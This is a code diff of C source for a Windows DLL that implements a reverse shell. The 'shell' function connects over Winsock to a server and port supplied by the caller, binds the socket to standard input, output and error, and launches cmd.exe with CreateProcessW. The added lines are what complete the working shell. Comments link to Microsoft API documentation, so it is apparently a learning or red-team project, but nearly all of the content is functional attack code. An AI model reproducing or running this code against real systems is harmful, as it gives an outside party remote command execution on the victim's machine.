@@ -6,9 +6,8 @@
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #define BUFLEN 1024
-#define SHELL "cmd.exe"
 
-int shell(char* server, unsigned int port) {
+int shell(LPWSTR server, unsigned int port) {
     WSADATA version;
     SOCKET socket;
     sockaddr_in addr;
@@ -21,17 +20,17 @@ int shell(char* server, unsigned int port) {
     //* https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa
     //* https://docs.microsoft.com/en-us/windows/win32/winsock/sockaddr-2
     //* https://docs.microsoft.com/en-us/windows/win32/api/winsock2/ns-winsock2-in_addr
-    //* https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-inet_addr
+    //* https://docs.microsoft.com/en-us/windows/win32/api/ws2tcpip/nf-ws2tcpip-inetptonw
     socket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL);
     addr.sin_family = AF_INET;
-    addr.sin_addr.s_addr = inet_addr(server); // Original has sin_addr.s_addr
+    InetPtonW(AF_INET, server, &(addr.sin_addr.s_addr)); // Original has sin_addr.s_addr
     addr.sin_port = htons(port);
 
     // Attempt to connect
     //* https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaconnect
     //* https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-closesocket
     //* https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsacleanup
-    if(WSAConnect(socket, (SOCKADDR*)&addr, sizeof addr) == SOCKET_ERROR) {
+    if(WSAConnect(socket, (SOCKADDR*)&addr, sizeof addr, NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
         closesocket(socket);
         WSACleanup();
         return -1;
@@ -50,14 +49,26 @@ int shell(char* server, unsigned int port) {
     }
 
     // Start shell
+    //* https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
+    //* https://docs.microsoft.com/en-us/windows/win32/learnwin32/working-with-strings
     STARTUPINFO sinfo;
     PROCESS_INFORMATION pinfo;
+    wchar_t commandName[] = L"cmd.exe";
     memset(&sinfo, 0, sizeof sinfo);
+    sinfo.cb = sizeof sinfo;
+    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW); // Tell it which other properties we're using
+    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)socket; // Set all I/O to the socket
+    CreateProcessW(NULL, commandName, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
 
 
 
-    
 
+
+
+
+    // Catchall, remove later
+    //* https://docs.microsoft.com/en-us/cpp/code-quality/c6335?view=vs-2019
+    CloseHandle(pinfo.hProcess);
 }
 BOOL APIENTRY DllMain( HMODULE hModule,
                        DWORD  ul_reason_for_call,
